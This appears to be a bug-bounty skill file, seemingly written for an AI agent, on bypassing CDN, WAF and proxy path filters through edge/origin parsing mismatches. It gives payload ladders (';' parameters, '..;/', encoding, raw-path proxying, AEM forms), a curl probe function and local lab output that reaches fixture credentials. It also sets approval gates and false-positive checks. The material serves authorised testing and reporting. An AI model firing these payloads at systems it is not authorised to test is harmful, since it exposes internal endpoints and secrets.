# Edge/CDN/proxy path-filter desync — the front tier blocked a string, the origin resolved a resource

<!-- workspace rung mapping -->

> **Rung mapping.** This file was written against a five-rung safety ladder. In this workspace those rungs are: **1** read-only · **2** write to an object _you_ own, reverted immediately · **3** bounded scale proof, 5–10 records, never a dump · **4** the same proof relocated to a UAT/OAT host · **5** anything touching a third party's object — **pause and ask d0x directly before executing**, providing the exact request, affected state and rollback plan. This is interactive routing, not a terminal state.

> **This file is the pack's single owner of edge-vs-origin path-filter desync.** A front tier (CDN, WAF, reverse proxy, API gateway, load-balancer path rule, AEM dispatcher) enforces a path / extension / selector allowlist or denylist that the origin never re-checks, so a request the edge believes it blocked is served by the backend. Other skills keep a recognition line and point here.
>
> **Boundary with the neighbours — three lines, do not blur them:**
>
> - `role-matrix.md` §1b owns the **403-bypass ladder as an authorization problem**: a route is gated by middleware/WAF/gateway authn and you want the gate to not fire. It owns the whole **METHOD** dimension (verb switching, `X-HTTP-Method-Override`/`_method`, CVE-2023-30845) and the routing-header transforms (`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Prefix`, Next.js `x-middleware-subrequest` CVE-2025-29927). Do not restate any of those here.
> - **This file** owns the case where the front tier is a **path filter**, not an authenticator — it decides from a regex over raw bytes which _resources, extensions and selectors_ may exist at all, and the origin's URL grammar is richer than that regex. What it adds over §1b is the grammar model that explains _why_ each transform lands, the selector / suffix / raw-path rungs §1b does not carry, and the tier-attribution oracle below.
> - the `tenant-isolation` skill owns the same parser disagreement when the consequence is a **cache key** rather than a filter decision. Same payload family, different bug: there the edge _stores_, here the edge _forwards_. If the crafted suffix produced a cache entry, that file owns it.
>
> When the edge holds against everything below, `request-smuggling.md` is the fallback — read its safety line before the first probe.

## Contents

- Why the class exists — two parsers, one URL
- Recognize the surface
- The ladder — six rungs, each with its oracle
- Tier attribution — response SIZE tells you which tier answered
- Executed lab — the ladder against a two-tier stack
- The `--path-as-is` trap (measured — it flips the verdict)
- Rung — where this stops being read-only
- The false-positive gate — reaching the origin is not the finding
- Route the unlocked outcome to its owner
- Converts?
- Evidence checklist

---

## Why the class exists — two parsers, one URL

The edge matches a **regex over the raw bytes of the path**. The origin parses those same bytes with a **grammar**: it percent-decodes, strips path parameters, resolves dot segments, splits selectors and a format extension off the last segment, hands the remainder to a route table, and passes what is left over as a suffix. Two parsers, one string, different answers.

Every bypass in this class is one of two moves:

- **The origin drops a token the regex sees.** Append noise that satisfies the allowlist and then vanishes before routing — a `;`-path parameter, an extra suffix segment, a dot segment. The edge approves a URL that the origin never resolves.
- **The origin produces a token the regex never saw.** Hide the blocked string from the regex and let the origin reconstruct it — percent-decoding, double decoding, case folding, `..` resolution. The edge approves a URL that does not yet contain the thing it blocks.

Three front-tier config families produce it, and each one fails to a different rung:

| Front tier decides from | Real-world spelling | Falls to |
| --- | --- | --- |
| the **derived extension** (last dot of the last segment of the raw path) | AEM dispatcher `/filter` `/extension`, nginx `location ~ \.json$`, "block by file type" CDN rules | `;` path parameters, suffix segments |
| a **literal substring or unanchored regex** on the raw path | WAF signature, CloudFront behaviour, ALB path rule, `location` prefix | percent-encoding, case folding, an allowed substring appended anywhere |
| a **prefix rule that forwards the path un-normalized** | Apache `ProxyPass ... nocanon`, `<LocationMatch>`, nginx `proxy_pass` without a trailing slash | `..%2f` / `..;/` climbing out of the allowed prefix |

**The AEM dispatcher is the worked example throughout** because its grammar is the best-documented one — Sling parses `/[resource].[selectors].[extension];[path-params]/[suffix]?[query]`, five places to hide a token where a dispatcher regex sees one path. Nothing below needs AEM. Rails `.:format`, Spring suffix-pattern matching, Tomcat `;jsessionid`, ASP.NET PathInfo and an Express `*` splat all give the origin a richer grammar than the edge's regex.

> The AEM URLs below are illustrations of each rung, one per rung, not a hunting checklist. **the `aem-hunting` skill is the canonical AEM form table** — go there for the full set of selectors, the version probes and the endpoint catalog. If you are extending the AEM forms, extend them there; this file owns the class, not the product.

## Recognize the surface

- **Two tiers exist at all**: `Via`, `X-Cache`, `X-Served-By`, `cf-ray`, `x-amz-cf-id`, `x-vercel-id`, `X-Vhost`, `Server: Communique-Dispatcher/<ver>` (AEM), a `Server` value that _changes_ between two paths on the same host. (A `Server` value that stays the same proves nothing — most edges rewrite it on every response. It is a positive signal only, never an attribution oracle; see "Tier attribution" below.)
- **One path answers in a different dialect than the rest of the app.** A templated HTML 403 where every other route returns JSON is the edge answering, not the app. That is the tell that a filter exists — and the baseline you will measure against.
- **A documented allowlist**: a WAF vendor's default ruleset, a `robots.txt` that names internal trees, a CDN behaviour list in an IaC repo, dispatcher `filter` rules committed to a public repo.
- **An origin with a richer grammar**: selectors/`.json` switching on a `.html` route, a `.:format` suffix, a `;jsessionid` that the app tolerates, an SSR data route (`/_next/data/<buildId>/x.json`) that mirrors an HTML route.
- **A blocked tree worth reaching**: an admin/console path, an internal API prefix, a config or query endpoint, a metrics/actuator route — anything the JS references but the edge refuses. `../../js-source-to-sink/SKILL.md` is where that list comes from; `../../ffuf-web-fuzzing/SKILL.md` extends it.

## The ladder — six rungs, each with its oracle

Walk them in order. All six are read-only `GET`s (rung 1) — fire them freely, one transform at a time, against **one** blocked path. Never spray the ladder across a route family with a wordlist.

### 1. Selector / extension smuggling — append an allowed extension after the real one

**Exploits**: a filter that derives "the extension" from the last dot it can find, while the origin takes the _last_ extension as the renderer and treats what precedes it as selectors.

```
/<blocked>.json/x.html        allowed extension as a suffix segment
/<blocked>.html/x.json        the inverse: allowed at the edge, JSON renderer at the origin
/<blocked>?x=.css             for edges that match the extension against the full URL incl. query
```

AEM form: `.html` is allowed and `.json` is blocked, so `/content/site/en.html` serves and `/content/site/en.json` is refused — then `/content/site/en.4.json`, `.tidy.json`, `.infinity.json` and `.querybuilder.json` re-enter through the selector slot.

**Oracle**: the **renderer changed**. You asked for a resource the allowlist approved as HTML and got a JSON/XML document body — `{"jcr:primaryType":...}` in the AEM case, any structured tree in the general case. Status alone proves nothing; the content type and the body shape do.

### 2. Path-parameter `;` smuggling

**Exploits**: RFC 3986 path parameters. The origin strips everything from `;` to the next `/` before routing; the edge treats `;` as an ordinary path character, so the last segment it sees — and therefore the extension it derives — is not the one the origin will use.

```
/<blocked>.json;x=a/b.css     the extension the edge derives is "css"; the origin routes .json
/etc;.json                    the deny rule was written for the exact string /etc.json
/<blocked>;.css               shortest form when the filter only reads the derived extension
```

**Oracle**: the blocked resource's real body returns while the edge's own logs/headers show it matched an allowed rule. Cheapest confirmation that the origin strips `;` at all: `/<known-good>.html;anything` still serves the known-good page.

### 3. `..;/` — a dot segment wearing a path parameter

**Exploits**: an origin that strips path parameters **before** resolving dot segments, so `..;` becomes `..` after the edge has already decided it is an ordinary segment name.

```
/<allowed-prefix>/..;/..;/<blocked>
/static/..;/..;/internal/config.json
```

**Patch gate — check before spending requests.** This is the Jetty bug: Jetty **≥ 9.4.35** normalizes/rejects the form, and the AEM Cloud SDK ships a patched Jetty. Do **not** burn probes on AEM-as-a-Cloud-Service or any modern Jetty. It is still live on on-prem AEM 6.x with old Jetty, on some Tomcat and Undertow configurations, and behind any proxy that forwards the raw path (rung 6). Fingerprint the backend first; if you cannot, spend exactly one probe and move on.

**Oracle**: a resource outside the allowed prefix returns its real body. The control that makes it a finding is the same path _without_ the climb — `/<allowed-prefix>/<blocked>` → the edge's block response.

### 4. Unanchored-regex suffix

**Exploits**: an allow rule written `\.html` instead of `\.html$`. Anything containing the allowed token anywhere passes.

```
/<blocked>/anything.html
/<blocked>.json/x.html
/crx/de/index.jsp/.html
```

This is rung 1 seen from the filter's side, and it is worth separating because it tells you something about the ruleset: if `/x/y.json/anything.html` passes but `/x/y.json;a=b.html` does not, the rule is an unanchored regex rather than a derived-extension filter — and that changes which later rungs are worth trying (unanchored regexes fall to encoding, extension filters do not).

**Oracle**: the blocked body returns, and appending the same token to a _different_ blocked path works too. One-path-only success is a routing accident, not a ruleset property.

### 5. Encoding and normalization variants

**Exploits**: the edge does not decode; the origin does. Or the edge decodes once and the origin twice.

```
%2e for '.'            /bin/query%2ejson
%2f for '/'            /allowed/..%2f..%2f<blocked>
%252e / %252f          when a two-layer stack decodes once at each hop
mixed case             /BIN/QUERY.JSON        (case-sensitive regex, case-insensitive route table)
trailing slash         /<blocked>.json/
trailing dot           /<blocked>.
%00, %0a, %0d          C-string and line-oriented path layers
```

**Encoding alone rarely wins against a derived-extension filter** — measured below: a filter that splits on the last literal `.` simply sees no extension in `query%2ejson` and falls through to its default deny. It wins against literal-substring and unanchored-regex rules. **The payload that lands is usually two rungs chained** — encode the part the substring rule matches, and add a `;`-parameter to fix the extension the extension rule reads. The measured example below is exactly that: `/int%65rnal/config.json` is denied and `/int%65rnal/config.json;x=a/b.css` returns the config.

The full delimiter-vs-encoding matrix (raw / encoded / double-encoded, and which stacks truncate at each delimiter) is written out once in `../../tenant-isolation/references/cache-deception.md` — reuse that table, do not rebuild it.

### 6. Raw-path (`nocanon`-style) proxying — the front tier forwards what you sent

**Exploits**: a proxy rule that hands the **un-normalized** path to the backend. Apache `ProxyPass ... nocanon` and `<LocationMatch>` blocks do this by design; nginx `proxy_pass` without a trailing slash forwards the raw URI; several API gateways pass through the original path. Once one prefix on the host is proxied raw, that prefix is a tunnel to every path the backend can resolve.

```
/<raw-proxied-prefix>/..%2f..%2f<blocked>
/graphql/execute.json/..%2f../bin/querybuilder.json      (the AEM form)
```

**Detect it in one request, before building a payload**: request `<prefix>/<nonce>` under the suspected raw-proxied prefix. If the response comes from the _backend_ (backend 404 shape, backend content type) rather than the edge's block page, the prefix is proxied and the whole rung is open. On AEM: `GET /graphql/execute.json/test` and `GET /adobe/dynamicmedia/deliver/test`.

**Oracle**: a resource under a _different_ prefix returns its body through the raw-proxied prefix, while the same resource requested directly returns the edge's block response.

## Tier attribution — response SIZE tells you which tier answered

The whole ladder depends on one question: **did that response come from the edge or from the origin?** Status codes do not answer it — both tiers return 403s and 404s, and edges routinely return the origin's status while substituting their own body. Headers do not answer it either: an edge normally rewrites `Server` on both paths (measured below — the blocked response and the bypassed response carried the _same_ `Server` value).

**Response size answers it.** An edge-generated error is a large templated document; an origin error for a route that does not exist is a terse machine response. In the AEM case the reported figures are a **~28 KB** Apache/dispatcher 403 page against a **~845 B** backend 404 — a 33x gap that no eyeball comparison of status codes gives you.

Measure both baselines **first**, then classify every probe by which cluster its size falls into:

```bash
probe() { curl -s --path-as-is -o /dev/null -w "%{http_code} %{size_download}\t$1\n" "$BASE$1"; }

probe '/<known-good>.html'          # baseline A: a 200 that definitely came from the origin
probe '/<blocked-path>'             # baseline B: the edge's block page  -> its byte count
probe '/<allowed-ext-nonce>.html'   # baseline C: allowed at the edge, no route at the origin
```

Baseline C is the one hunters skip and the one that pays: it is the **origin's** 404, and every later probe that returns a 404 of that size **reached the backend**. A bypass that lands on an unregistered route still proves the desync — you then move the payload onto a path that exists.

Three rules that follow from it:

- **Every edge denial has the same byte count.** Identical sizes across unrelated blocked paths = one static error document = the edge. A size that varies with the path came from the app.
- **Keep the curl flag set identical between baseline and probe.** `--compressed`, `-L`, and a `Range` header all change `size_download`; a size difference caused by your own flags is a false positive you generated.
- **Corroborate with content type, never with `Server`.** `text/html` where the app speaks `application/json` is the edge; the reverse is the origin. `Server` is rewritten by the edge on both paths and is worthless for attribution.

## Executed lab — the ladder against a two-tier stack

Two processes on this host: an edge on `:8931` running an ordered filter (a raw-path prefix rule, a prefix allow, a literal-substring deny, a derived-extension deny, a derived-extension allow, then default deny), forwarding the **raw** path to an origin on `:8932` whose grammar percent-decodes once, strips `;`-parameters per segment, resolves dot segments, then splits `resource / extension / suffix`. Block page 30,250 B. Real output:

```
=== baselines ===
200 87          /content/page.html                     <- A: origin 200
403 30250       /content/page.json                     <- B: the edge's block page
404 24          /bin/nope.html                         <- C: the ORIGIN's 404

=== the ladder ===
403 30250       /bin/query.json                            control - blocked
200 124         /bin/query.json;x=a/b.css                  rung 2  - landed
200 124         /bin/query.json/x.html                     rung 4  - landed
403 30250       /bin/query%2ejson                          rung 5 alone - DENIED
403 30250       /internal/config.json                      control - blocked
403 30250       /int%65rnal/config.json                    rung 5 alone - DENIED
200 107         /int%65rnal/config.json;x=a/b.css          rungs 5+2 chained - landed
200 107         /static/..;/..;/internal/config.json       rung 3  - landed
200 124         /graphql/execute.json/..%2f..%2fbin/query.json   rung 6 - landed
```

Bodies of the three that mattered:

```
/bin/query.json;x=a/b.css
  {"success":true,"results":2,"total":2,"more":false,"offset":0,
   "hits":[{"path":"/etc/users/aaa"},{"path":"/etc/users/bbb"}]}
/int%65rnal/config.json;x=a/b.css
  {"aws.access.key":"AKIA-LAB-FIXTURE-0000","admin.pw.hash":"$2y$LAB$fixture","smtp.password":"lab-fixture"}
/static/..;/..;/internal/config.json
  {"aws.access.key":"AKIA-LAB-FIXTURE-0000","admin.pw.hash":"$2y$LAB$fixture","smtp.password":"lab-fixture"}
```

Five things to carry out of that run:

1. **Every edge denial is exactly 30250 B; every origin response is 24–124 B.** Two clusters, three orders of magnitude apart. You can classify the whole sweep from the size column without reading a single body. That is the oracle.
2. **`404 24` is not a failure.** It is baseline C — the origin answering. A 404 at 24 B and a 403 at 30250 B are opposite results even though both are "errors".
3. **Encoding alone was denied twice, for two different reasons.** `/bin/query%2ejson` left the filter with no extension it recognized, so it fell through to the default deny; `/int%65rnal/config.json` cleared the substring rule but was then caught by the extension deny — one rung short. Those two negative controls are what make the sweep discriminating; a ladder where everything "works" is a ladder that is measuring nothing.
4. **The payload that reached the credentials was two rungs chained**, and neither half worked alone. When a single transform fails, combine it with the one that fixes the _other_ rule.
5. **Headers did not distinguish the tiers.** Both the blocked and the bypassed response carried the same `Server: edge(lab)`; only content type and size separated them.

The block-page size here is a synthetic fixture chosen to sit in the same order of magnitude as the ~28 KB figure reported for the AEM dispatcher. The _ratio_ and the method are what transfer; the absolute numbers on your target are whatever baselines A/B/C measure.

## The `--path-as-is` trap (measured — it flips the verdict)

curl resolves dot segments client-side, so a payload containing a literal `..` or `/./` never leaves the machine in the shape you typed. Measured against the lab, same URL, one flag apart:

```
/static/../internal/config.json   plain       -> 403 30250   (curl sent /internal/config.json - the edge blocked it)
/static/../internal/config.json   path-as-is  -> 200 107     (the raw path went out - the origin served the config)
```

Without the flag you record "the bypass failed" for a request you never sent. Two corollaries, both measured: `..;/` is **not** a dot segment to curl and goes out untouched either way, and percent-encoded forms (`..%2f`, `%2e`, `%252e`) are byte-for-byte identical with or without it. `--path-as-is` matters **only** for literal `..` and `/./` — so just set it on every probe in this file and stop thinking about it. Fuller executed evidence for curl's normalization behaviour lives in `../../tenant-isolation/references/cache-deception.md`.

## Rung — where this stops being read-only

Import the **Rung mapping** above.

- **The whole ladder above is rung 1.** Read verbs against a blocked path change no state. Fire them on prod.
- **A `GET` that reaches an internal _read_ endpoint stays rung 1** — the QueryBuilder tree, the config JSON, the metrics route. Read one representative response, not the tree.
- **A bypass that reaches a WRITE is rung 5 — ask d0x directly before executing.** This is not hypothetical and it is the specific place hunters get this class wrong: the AEM `cloudsettings.bulkimportConfig.json` primitive writes caller-supplied properties into a **shared config path** (`/conf/global/settings/...`) which a second servlet then dispatches as a script. That is a write to production configuration that every tenant of the instance reads, and there is no self-owned object to scope it to. It is not a "priority 1, run it first" step — it is not attempted until d0x approves it, and the read-side proof (rung 1) that the servlet is reachable through the filter, and by which actor, is usually enough to carry the report. **Do not describe that primitive as pre-auth without proving it.** NVD scores the whole APSB25-90 family as requiring a low-privilege account, and one item in that bulletin requires a high-privilege one — Adobe and the researchers published no endpoint-to-CVE mapping, so which item that is remains inferred. Practically: an anonymous 401/403 on these paths means "wrong actor", not "patched" — re-fire with the lowest-privilege account you hold before drawing any conclusion. The same rung-5 rule covers any node-write, cache-purge, config-set or package-install you reach through a filter bypass.
- **A bypass that reaches a fetch sink** (an SSRF parameter behind the filter) is proven against **your own OOB listener** first — `../../ssrf-safe/SKILL.md` owns the ladder from there.
- Nothing denies a step for you. Before building the probe, decide whether it writes or touches another user; if it does, drop to the read-only equivalent and state the rest by inference.

## The false-positive gate — reaching the origin is not the finding

**A bypass that reaches public content is not a bug.** The most common way this class is written up and closed:

- **`.infinity.json` / a JSON tree of a page's own published content.** The page is public, the tree is the same data in another format. Working as designed — `../../validation/references/auto-discard.md` row 9 (`already-public`).
- **A 200 whose body is the login page, the SPA shell, or a generic marketing page.** Compare bodies, not statuses. The edge let you through to a route that renders nothing privileged.
- **A 404 from the origin.** Real evidence that the desync exists, and rung 0 as a finding. Move the payload to a path that resolves.
- **The blocked path was blocked for caching reasons, not security.** A CDN rule that refuses `.json` to protect a cache tier is not an access-control boundary. Ask what the origin does with the request when it arrives.
- **"The dispatcher/WAF can be bypassed" with no named resource behind it.** That is `no-poc` (`../../validation/references/auto-discard.md` row 13). The transform is the technique; the resource is the finding.

**The finding is what the bypass unlocks.** Name it, read one representative response, and file it as that class.

## Route the unlocked outcome to its owner

The desync is the door. Whatever is behind it belongs to the skill that proves its impact — open it yourself, in this session, carrying the working payload intact:

| What the bypass reached | Owner |
| --- | --- |
| a parameter the backend fetches (URL/host/webhook/import) | `../../ssrf-safe/SKILL.md` |
| another user's object by id, behind the filter | `../../idor-bola/SKILL.md` |
| another org's / tenant's data, or a tenant-scoped config tree | `../../tenant-isolation/SKILL.md` |
| a config/registry/env dump, cloud keys, credentials, a keystore | `../../exposed-secrets/SKILL.md` |
| an expression evaluator, a script/template dispatch, a deserializer, an upload | `../../rce-hunting/SKILL.md` |
| an admin route family that authenticates but never checks role | `role-matrix.md` §1 |
| the crafted suffix produced a **cache entry** rather than a filter bypass | the `tenant-isolation` skill |
| the edge held against every rung and you still believe the origin serves it | `request-smuggling.md` (read its safety line first) |

## Converts?

- **Bypass reaching only public content** — **informative, do not file.** No note, no lead. This is the majority outcome and writing it up costs credibility.
- **Bypass reaching non-public but non-sensitive backend metadata** (a resource tree of internal node names, a build descriptor, a route list) — **Low → Medium.** Grade it by what an attacker learns, and expect a program to argue it down. Worth filing only alongside the reach it enables.
- **Bypass reaching an internal read endpoint with real content** — a query/search API over non-public trees, an internal config or metrics route, an admin-only listing — **High**, graded on the data. Anchor on `../../validation/references/severity-anchors.md`.
- **Bypass reaching credentials, cloud keys or cross-tenant data** — **Critical**, and the report is about the credentials, not the transform. Prove them read-only via `exposed-secrets`.
- **Bypass reaching a write, a script dispatch or a deserializer** — **Critical** by class, but proven at rung 1 (reachability + the enforcing control that denies the direct path); the write itself stays d0x's approval before execution.

**Framing — which story to lead with.** Two different reports come out of the same evidence:

- **On a program whose vendor publicly designates the edge as the security boundary, "I bypassed it" is itself the finding.** Adobe's published position is that the AEM Dispatcher is the primary security control for production publish instances and that direct access to backend Sling resources should not be possible from the internet. When the vendor has said that, a demonstrated bypass is a boundary failure by their own definition and triagers accept the framing. The same applies to any program whose policy names its WAF/CDN as a compensating control. Lead with the bypass, then show what it reached.
- **Everywhere else, lead with the unlocked data and treat the bypass as the mechanism.** A report titled "dispatcher/CDN filter bypass" with a public JSON tree attached closes informative. The same evidence titled "internal configuration endpoint reachable from the internet, filter bypass as the vector" is the same bug and pays.

Deflate honestly: if you cannot name the resource, you have a technique, not a finding.

## Evidence checklist

Write to `targets/<program>/leads/` in the format in `templates/lead.md`, **Group:** `auth-logic`:

1. **The three baselines with sizes** — origin 200, edge block page, origin 404 — as the tier attribution. This is what lets a triager reproduce the classification, not just the request.
2. **The negative control**: the blocked path, untransformed, returning the edge's block response (status **and** byte count).
3. **The exact payload**, byte for byte, with the curl flags used (`--path-as-is` included). One transform per line so the triager can see which rung landed.
4. **The response**: status, content type, byte count, and the body redacted to its field names.
5. **Which rung landed and which did not** — the failed transforms are what prove the ruleset was really enforcing rather than absent. A sweep where everything succeeds is a sweep of an unfiltered host.
6. **The named resource behind the door**, and the follow-up call that proves what it authorizes — the actual finding.
7. **The front-tier fingerprint** (`Via`/`X-Cache`/`Server`/`X-Vhost`/vendor) and, if you can pin it, the backend and its version — because the `..;/` rung has a patch gate and a triager will ask.
8. **Cleanup status** if anything was written — and if it was, that it was an object you own.
